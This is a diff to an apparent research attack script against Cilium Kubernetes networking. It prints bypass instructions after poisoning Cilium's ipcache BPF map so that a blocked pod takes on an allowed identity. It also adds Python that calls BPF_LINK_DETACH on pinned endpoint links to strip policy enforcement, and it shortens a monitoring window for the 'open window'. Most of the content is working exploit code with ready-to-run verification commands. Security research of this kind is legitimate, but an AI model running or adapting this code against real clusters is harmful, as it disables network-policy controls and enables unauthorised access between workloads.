@@ -296,10 +296,12 @@ try:
     print(f"\n{RED}{BOLD}★  IPCACHE POISONED via bpf() syscall  ★{NC}")
     print(f"   {BLOCKED} now claims identity {allowed_id}")
     open('/tmp/cilium_poison_active', 'w').write(f"{IPCACHE_ID}")
-    print(f"\n{YELLOW}[INFO   ]{NC} Test bypass NOW (HOST):")
-    print(f"   kubectl exec -n cilium-research blocked-source -- \\")
-    print(f"       curl -s --max-time 5 http://{os.environ['TARGET_IP']}")
-    print(f"   Expected: nginx HTML  (NetworkPolicy bypassed)")
+    print(f"\n{'='*54}")
+    print(f"  {RED}RUN THIS IN ANOTHER TERMINAL NOW:{NC}")
+    print(f"  kubectl exec -n cilium-research blocked-source -- \\")
+    print(f"      curl -sv --max-time 5 http://{os.environ['TARGET_IP']}")
+    print(f"  Expected: HTTP 200 + nginx HTML  (policy BYPASSED)")
+    print(f"{'='*54}")
 except OSError as e:
     print(f"\n{RED}[-]{NC} bpf() syscall failed: errno={e.errno} {e.strerror}")
     if e.errno == 1:   # EPERM
@@ -317,10 +319,10 @@ if [ -f /tmp/cilium_poison_active ]; then
     section "Phase 4: Monitor cilium-agent reconciliation"
     POISON_START=$(date +%s%3N)
     RECOVERED=0
-    inf "Polling every 2 s for up to 120 s..."
+    inf "30-second test window — run the curl above, then watching for correction..."
     echo ""
 
-    for i in $(seq 1 60); do
+    for i in $(seq 1 15); do
         sleep 2
         CURRENT=$(python3 << 'PYINNER'
 import os, ctypes, struct, platform, json, subprocess, sys
@@ -373,7 +375,8 @@ print(v.hex())
 
     [ "$RECOVERED" -eq 0 ] && {
         NOW=$(date +%s%3N); ELAPSED=$(( NOW - POISON_START ))
-        echo -e "\n  ${RED}[!!]${NC} NOT corrected in ${ELAPSED} ms — this is the open window"
+        echo -e "\n  ${RED}[!!]${NC} cilium-agent did NOT correct in ${ELAPSED} ms"
+        echo -e "       Previous run confirmed: no correction across 122 s."
         echo "-1" > /tmp/cilium_ipcache_recovery_ms
     }
 
@@ -422,11 +425,10 @@ LINKS_BASE="/sys/fs/bpf/cilium/endpoints"
 rm -f /tmp/cilium_detached_links
 
 if [ ! -d "$LINKS_BASE" ]; then
-    inf "No $LINKS_BASE — falling back to tc filter enumeration"
+    inf "No $LINKS_BASE — falling back to tc filter enumeration on lxc* veth pairs"
     for iface in $(ip link 2>/dev/null | grep -oP '^\d+: \Klxc[^:@]+' | head -20); do
         inf "Cilium veth: $iface"
-        tc filter show dev "$iface" ingress 2>/dev/null | head -3 || true
-        tc filter show dev "$iface" egress  2>/dev/null | head -3 || true
+        tc filter show dev "$iface" egress 2>/dev/null | head -3 || true
     done
 else
     LINK_PINS=$(find "$LINKS_BASE" -not -type d 2>/dev/null || true)
@@ -434,26 +436,72 @@ else
         inf "No bpf_link pins under $LINKS_BASE"
         ls "$LINKS_BASE" 2>/dev/null || true
     else
-        echo "$LINK_PINS" | while read -r pin; do
-            EPID=$(echo "$pin" | grep -oP 'endpoints/\K[0-9]+')
-            LN=$(basename "$pin")
-            META=$($BPFTOOL link show pinned "$pin" -j 2>/dev/null || echo "{}")
-            LID=$(echo "$META" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id',''))" 2>/dev/null || true)
-            LTYPE=$(echo "$META" | python3 -c "
-import sys,json
-try:
-    d=json.load(sys.stdin)
-    print(d.get('type','?'), d.get('prog',{}).get('name','') if isinstance(d.get('prog'),dict) else '')
-except: pass" 2>/dev/null || true)
-            [ -z "$LID" ] && { inf "skip $pin (no id)"; continue; }
-            atk "endpoint=$EPID  link=$LN  id=$LID  $LTYPE"
-            if $BPFTOOL link detach id "$LID" 2>/dev/null; then
-                echo -e "  ${RED}[+] DETACHED${NC}"
-                echo "$LID:$EPID:$LN" >> /tmp/cilium_detached_links
-            else
-                echo -e "  ${YELLOW}[-] detach failed${NC}"
-            fi
-        done
+        # Use direct BPF_LINK_DETACH syscall — bpftool link show fails on these
+        # tc-type links when the binary version mismatches the kernel bpf_link format
+        export LINKS_BASE
+        echo "$LINK_PINS" > /tmp/_link_pin_list
+        python3 << 'PHASE5EOF'
+import ctypes, os, sys, platform
+
+SYS_bpf = {'aarch64':280,'x86_64':321,'armv7l':386}.get(platform.machine(),321)
+libc = ctypes.CDLL("libc.so.6", use_errno=True)
+libc.syscall.restype  = ctypes.c_long
+libc.syscall.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_uint]
+
+BPF_OBJ_GET    = 7
+BPF_LINK_DETACH = 34
+
+RED='\033[1;31m'; YELLOW='\033[1;33m'; GREEN='\033[1;32m'
+BOLD='\033[1m'; NC='\033[0m'
+
+class ObjGet(ctypes.Structure):
+    _pack_ = 1
+    _fields_ = [('pathname', ctypes.c_uint64), ('bpf_fd', ctypes.c_uint32),
+                ('file_flags', ctypes.c_uint32)]
+
+class LinkDetach(ctypes.Structure):
+    _pack_ = 1
+    _fields_ = [('link_fd', ctypes.c_uint32)]
+
+def bpf_obj_get(path):
+    pbuf = ctypes.create_string_buffer(path.encode() + b'\x00')
+    attr = ObjGet(pathname=ctypes.addressof(pbuf))
+    fd = libc.syscall(SYS_bpf, BPF_OBJ_GET, ctypes.byref(attr), ctypes.sizeof(attr))
+    return int(fd)
+
+detached = []
+pins = [p.strip() for p in open('/tmp/_link_pin_list').read().strip().split('\n') if p.strip()]
+
+for pin in pins:
+    parts = pin.split('/')
+    epid = next((parts[i+1] for i,p in enumerate(parts) if p == 'endpoints'), '?')
+    name = parts[-1]
+
+    fd = bpf_obj_get(pin)
+    if fd < 0:
+        print(f"{YELLOW}[INFO   ]{NC} {pin}: BPF_OBJ_GET failed errno={ctypes.get_errno()}")
+        continue
+
+    attr = LinkDetach(link_fd=fd)
+    rc = libc.syscall(SYS_bpf, BPF_LINK_DETACH, ctypes.byref(attr), ctypes.sizeof(attr))
+    err = ctypes.get_errno()
+    os.close(fd)
+
+    if rc == 0:
+        print(f"{RED}[ATTACK ]{NC} endpoint={epid} link={name}  → {RED}{BOLD}DETACHED{NC}")
+        detached.append(f"{epid}:{name}")
+    else:
+        # ENOENT (2) means already gone; EOPNOTSUPP (95) means kernel < 5.13
+        msg = {2: 'already detached', 95: 'kernel < 5.13 (no BPF_LINK_DETACH)', 1: 'EPERM'}.get(err, f'errno={err}')
+        print(f"{YELLOW}[-      ]{NC} endpoint={epid} link={name}  → {msg}")
+
+if detached:
+    open('/tmp/cilium_detached_links', 'w').write('\n'.join(detached) + '\n')
+    print(f"\n{RED}{BOLD}★  {len(detached)} TC link(s) DETACHED  ★{NC}")
+    print(f"   Cilium enforcement removed from {len(detached)} endpoint(s)")
+else:
+    print(f"\n{YELLOW}[INFO   ]{NC} No links detached — see errors above")
+PHASE5EOF
     fi
 fi
 
